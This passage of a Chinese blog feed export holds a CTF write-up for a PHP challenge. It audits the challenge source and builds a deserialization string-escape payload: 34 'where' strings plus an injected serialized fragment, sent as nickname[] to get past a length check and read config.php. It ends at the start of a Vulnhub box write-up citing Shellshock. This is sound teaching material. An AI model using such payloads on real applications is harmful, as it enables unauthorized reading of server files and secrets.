class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">update</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Please</span> <span class="title">Update</span> <span class="title">Your</span> <span class="title">Profile</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Email</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">email</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Nickname</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">nickname</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">file</span>&quot;&gt;<span class="title">Photo</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">photo</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">UPDATE</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 6.index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Login</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">LOGIN</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<p>通过代码审计发现可能存在着以下三个漏洞：</p>
<ul>
<li>SQL注入</li>
<li>反序列化</li>
<li>文件上传</li>
</ul>
<p>我们输入得内容都会被过滤：</p>
<ul>
<li><code>'</code>和<code>\\\\</code>都会被替换成<code>_</code>;</li>
<li>select, update, delete, where 都会被替换成 hacker</li>
</ul>
<p>以login功能为例，如果想要SQL注入，我们需要：</p>
<ul>
<li>知道username是否存在</li>
<li>将查询得结果中的密码和我们输入的密码md5后进行强类型比较；</li>
</ul>
<p>这显然是不太可能绕过的，因此想一下文件上传。我们上传的任何文件都会被<code>move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));</code>，从而得不到php后缀的文件，因此文件上传也不可能。</p>
<p>那最后就剩下反序列了。通过对源码的分析，得到如下过程(从后往前)： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. config.php中有$flag；</span><br><span class="line">   </span><br><span class="line">2. profile.php中的$profile = unserialize($profile);，并且$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));将profile类对象中的photo的值读取出来</span><br><span class="line">   </span><br><span class="line">3. profile.php中的$profile=$user-&gt;show_profile($username);得到的$profile</span><br><span class="line">   </span><br><span class="line">4. update.php中的$user-&gt;update_profile($username, serialize($profile));传入$profile的值</span><br></pre></td></tr></table></figure></p>
<p>从前往后理一下思路：首先，我们通过更新简介传入4个属性，<code>phone, email, nickname, photo</code>；然后这四个属性经过序列化，再<strong>过滤</strong>最后得到$profile；然后又被profile.php调用，反序列化并将其中photo属性的值（应是文件名）读取base64编码后返回到页面。</p>
<h1 id="前置知识">2 前置知识</h1>
<h2 id="属性中含有数组该如何反序列化">2.1 属性中含有数组该如何反序列化</h2>
<p>编写如下测试代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span> = <span class="keyword">Array</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> Test1;</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> Test2;</span><br><span class="line">print_r(serialize(<span class="variable">$test1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">print_r(serialize(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;&#125;  </span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Test2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;hello world&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>因此，如果需要在序列化中提交数组，需要注意这一点，不仅需要闭合双引号，还要把<code>&#123;&#125;</code>也给闭合了。</p>
<h2 id="数组绕过一些函数">2.2 数组绕过一些函数</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line"><span class="number">2</span>. sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line"><span class="number">3</span>. ereg(pattern,<span class="keyword">Array</span>()) =<span class="literal">null</span></span><br><span class="line"><span class="number">4</span>. preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line"><span class="number">5</span>. strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) =<span class="literal">null</span></span><br><span class="line"><span class="number">6</span>. strpos(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line"><span class="number">7</span>. strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>以及 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="literal">null</span> &gt; <span class="number">10</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> &lt; <span class="number">10</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> == <span class="number">0</span>);</span><br><span class="line">var_dump(<span class="literal">null</span> === <span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure></p>
<p>因此可以把null当作0，但是为bool型，所以强类型比较结果为false</p>
<h2 id="反序列化溢出">2.3 反序列化溢出</h2>
<p>可以查看<a href="https://hdfzzf.icu/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/">反序列化知识点</a></p>
<h2 id="序列化后的属性顺序">2.4 序列化后的属性顺序</h2>
<p>编写代码测试： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果将属性颠倒一下，其余不变 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;4&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>得到的结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;profile&quot;:4:&#123;s:5:&quot;photo&quot;;s:1:&quot;4&quot;;s:8:&quot;nickname&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:1:&quot;2&quot;;s:5:&quot;phone&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>结论</strong>：从以上实验可以看出，编写类的时候属性的先后顺序就是序列化后字符串中属性的先后顺序。</p>
<h1 id="解题">3 解题</h1>
<p>我们的目的就是将photo的值改为<code>config.php</code>，但是photo的内容会经过md5加密，因此不能直接利用，这时候就要利用photo一个面的属性，即nickname。（这里并没有给出profile类的属性的顺序，那就认为源码中赋值的顺序就是类中属性的顺序，如果不是再尝试嘛，这不是重点）</p>
<p>假设序列化后的字符串如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;&#125; </span><br></pre></td></tr></table></figure></p>
<p>如果我们在nickname里面塞下我们想要的photo的值<code>";s:5:"photo";s:10:"config.php";&#125;</code>，即： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">37</span>:<span class="string">&quot;m1ku&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125; </span></span><br></pre></td></tr></table></figure></p>
<p>虽然确实塞进去了，但是因为此时nickname的值的长度也在变化（变成了37），所以塞入的这些内容还是属于nickname。因此，需要想办法让其逃逸出来，根据以往类似题目的经验，<strong>如果序列化后的字符串经过过滤函数，把某些关键词替换成长度不一样的词，则会出现反序列化溢出漏洞</strong>。而本题确实存在过滤函数，那就是class.php中mysql类中的filter方法。</p>
<p>该方法过滤的情况在<a href="#1%20题目信息">1 题目信息</a>中说明过了，这里不再说明。由于我们传入的nickname不能有特殊的符号，所以我们采取第二种。注意到<code>where</code>替换成<code>hacker</code>时，字符串长度变了！因此，利用点就是这个。每有一个where，字符串就能逃逸出一个，我们需要注入的是<code>";s:5:"photo";s:10:"config.php";&#125;</code>长度为33，因此需要33个where。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nickname</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>编写代码测试一下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span>=<span class="string">&#x27;12345678910&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span>=<span class="string">&#x27;m1ku@m1ku.com&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$photo</span>=<span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> profile;</span><br><span class="line"><span class="variable">$p</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="variable">$pafter</span> = preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$p</span>);</span><br><span class="line">print_r(<span class="variable">$pafter</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">替换前：</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">198</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">替换后：</span></span><br><span class="line"><span class="string">O:7:&quot;</span>profile<span class="string">&quot;:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678910</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:13:&quot;</span>m1ku@m1ku.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;m1ku&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">整理一下：</span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;profile&quot;</span>:<span class="number">4</span>:&#123;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678910&quot;</span>;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;m1ku@m1ku.com&quot;</span>;</span><br><span class="line">s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">198</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125; <span class="comment">// 到这里正好，下一行内容被丢弃</span></span><br><span class="line"><span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125;      </span></span><br></pre></td></tr></table></figure></p>
<p>payload构造好了，接下来看一下有没有限制条件。发现除了过滤函数，还剩下一个，那就是<code>strlen($_POST['nickname']) &gt; 10</code>得为false，按照我们那么长的payload，这里肯定为true，这时候就利用<a href="#2%202%20数组绕过一些函数">2 2 数组绕过一些函数</a>，传入<code>nickname[]</code>就能够为false，从而绕过。</p>
<p>而<a href="#2%201%20属性中含有数组该如何反序列化">2 1 属性中含有数组该如何反序列化</a>里面也说明了，如果类属性中有数组，需要闭合<code>&#123;&#125;</code>，因此最终需要注入的应该是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; </span><br></pre></td></tr></table></figure></p>
<p>（注意}的位置，别搞错了）此时长度为34，因此，需要34个where，所以最终的payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname[]:</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来随便注册一个账号，然后登录，再profile.php页面输入信息(此时nickname先随便输)，然后抓包，修改其中nickname的值和名字：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171816.png" /></p>
<p>此时虽然有提示，但是已经上传成功了。然后回到profile.php页面，查看源码</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171916.png" /></p>
<p>base64解码即可：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171951.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>源码审计</tag>
        <tag>反序列化溢出</tag>
        <tag>属性值为数组的序列化</tag>
        <tag>数组绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>10 Vulnhub HackSudoThor Writeup</title>
    <url>/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo: Thor</a></p>
<p>难度：中</p>
<p>目标：取得root权限 + 2 Flag</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>web路径爬取</li>
<li><strong>开源源码泄露</strong></li>
<li>默认账号密码</li>
<li><strong>破壳漏洞</strong></li>
<li><strong>GTFOBins提权</strong></li>
</ul>
<h1 id="common-gateway-interface-基础">Common Gateway Interface 基础</h1>
